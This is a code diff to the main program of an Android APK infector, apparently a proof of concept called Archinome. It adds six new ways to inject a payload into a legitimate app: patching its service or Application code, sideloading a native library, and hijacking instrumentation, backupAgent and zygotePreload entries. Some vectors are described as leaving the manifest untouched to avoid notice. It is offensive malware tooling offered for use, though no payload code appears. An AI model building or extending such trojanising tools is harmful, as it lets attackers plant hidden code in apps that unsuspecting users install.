@@ -17,7 +17,17 @@ import (
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 )
 
-var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)\nenv:\n\tARCHINOME_ADD_INTERNET=1 - also add <uses-permission android:name=\"android.permission.INTERNET\"/>\n\t    to the manifest (needed by the listen-mode gadget of option 2 on hosts that\n\t    declare no INTERNET permission; skipped for option 7)"
+var help_str = "Usage:\nmain input.apk output.apk -o [option]\noptions:\n\t1 - custom payload\n\t2 - frida inject\n\t3 - provider inject\n\t4 - trampoline inject\n\t5 - receiver inject\n\t6 - app component factory inject\n\t7 - native payload (lib injection, see ARCHINOME_NATIVE_* env)\n\t8 - encrypted assets payload (dex in assets/, runtime DexClassLoader + reflection,\n\t    trigger selectable via ARCHINOME_ASSETS_VECTOR=appfactory|provider|receiver)\n\t9 - code patch of the services the host declares (manifest untouched)\n\t10 - native sideload: payload under a library name the host asks for but does\n\t    not ship (learned from the app's own loadLibrary calls)\n\t11 - code patch of the host Application class (manifest untouched)\n\t12 - <instrumentation> carrier (trigger: am instrument)\n\t13 - android:backupAgent carrier (trigger: bmgr backupnow / auto-backup)\n\t14 - android:zygotePreloadName carrier + app-zygote service (trigger: the\n\t    isolated service is started)\nenv:\n\tARCHINOME_ADD_INTERNET=1 - also add <uses-permission android:name=\"android.permission.INTERNET\"/>\n\t    to the manifest (needed by the listen-mode gadget of option 2 on hosts that\n\t    declare no INTERNET permission; skipped for option 7)"
+
+// validOption keeps the CLI surface closed: every accepted value maps to a
+// vector, and anything else prints the usage block.
+func validOption(o string) bool {
+	switch o {
+	case "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14":
+		return true
+	}
+	return false
+}
 
 func main() {
 
@@ -36,7 +46,7 @@ func main() {
 		return
 	}
 
-	if len(os.Args) < 5 || (os.Args[4] != "1" && os.Args[4] != "2" && os.Args[4] != "3" && os.Args[4] != "4" && os.Args[4] != "5" && os.Args[4] != "6" && os.Args[4] != "7" && os.Args[4] != "8") {
+	if len(os.Args) < 5 || !validOption(os.Args[4]) {
 		fmt.Println(help_str)
 		return
 	}
@@ -57,6 +67,18 @@ func main() {
 		utils.Payload_option = int(utils.Native_payload)
 	} else if os.Args[4] == "8" {
 		utils.Payload_option = int(utils.Assets_payload)
+	} else if os.Args[4] == "9" {
+		utils.Payload_option = int(utils.Service_payload)
+	} else if os.Args[4] == "10" {
+		utils.Payload_option = int(utils.Native_sideload_payload)
+	} else if os.Args[4] == "11" {
+		utils.Payload_option = int(utils.CodePatchApp_payload)
+	} else if os.Args[4] == "12" {
+		utils.Payload_option = int(utils.Instrumentation_payload)
+	} else if os.Args[4] == "13" {
+		utils.Payload_option = int(utils.BackupAgent_payload)
+	} else if os.Args[4] == "14" {
+		utils.Payload_option = int(utils.ZygotePreload_payload)
 	}
 
 	// if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
@@ -65,7 +87,8 @@ func main() {
 	// }
 
 	fmt.Println("Parsing APK...")
-	if utils.Payload_option == int(utils.Native_payload) {
+	if utils.Payload_option == int(utils.Native_payload) ||
+		utils.Payload_option == int(utils.Native_sideload_payload) {
 		// The native vector edits lib/<abi>/*.so only -- it never needs the
 		// manifest, and split APKs have manifests this parser cannot handle.
 		fmt.Println("	--Skipped: the native vector works on lib/<abi> only")
@@ -115,6 +138,24 @@ func main() {
 	} else if utils.Payload_option == int(utils.Native_payload) {
 		// The native vector does not touch the manifest or the dex at all.
 		fmt.Println("	--Native vector: manifest and dex left untouched")
+	} else if utils.Payload_option == int(utils.Native_sideload_payload) {
+		// Same: the payload is a library file, nothing else changes.
+		fmt.Println("	--Native sideload vector: manifest and dex left untouched")
+	} else if utils.Payload_option == int(utils.Service_payload) ||
+		utils.Payload_option == int(utils.CodePatchApp_payload) {
+		// The code-patch vectors run from a class the app already
+		// instantiates, so nothing has to be declared anywhere.
+		fmt.Println("	--Code-patch vector: manifest left untouched")
+	} else if utils.Payload_option == int(utils.Instrumentation_payload) {
+		fmt.Println("	--Patching manifest (instrumentation inject)...")
+		manifest.PatchInstrumentation()
+	} else if utils.Payload_option == int(utils.BackupAgent_payload) {
+		fmt.Println("	--Patching manifest (backupAgent inject)...")
+		manifest.PatchBackupAgent()
+	} else if utils.Payload_option == int(utils.ZygotePreload_payload) {
+		fmt.Println("	--Patching manifest (zygotePreload inject)...")
+		manifest.PatchZygotePreload()
+		manifest.PatchZygoteService()
 	} else {
 		fmt.Println("	--Patching manifest...")
 		manifest.Patch()
@@ -132,7 +173,11 @@ func main() {
 	// real world declares no INTERNET permission at all. Off by default: the
 	// patched APK then keeps exactly the permission set the host shipped with.
 	// The native vector never touches the manifest, so it is skipped there.
-	if os.Getenv("ARCHINOME_ADD_INTERNET") == "1" && utils.Payload_option != int(utils.Native_payload) {
+	if os.Getenv("ARCHINOME_ADD_INTERNET") == "1" &&
+		utils.Payload_option != int(utils.Native_payload) &&
+		utils.Payload_option != int(utils.Native_sideload_payload) &&
+		utils.Payload_option != int(utils.Service_payload) &&
+		utils.Payload_option != int(utils.CodePatchApp_payload) {
 		fmt.Println("	--Patching manifest (android.permission.INTERNET)...")
 		manifest.PatchInternetPermission()
 	}
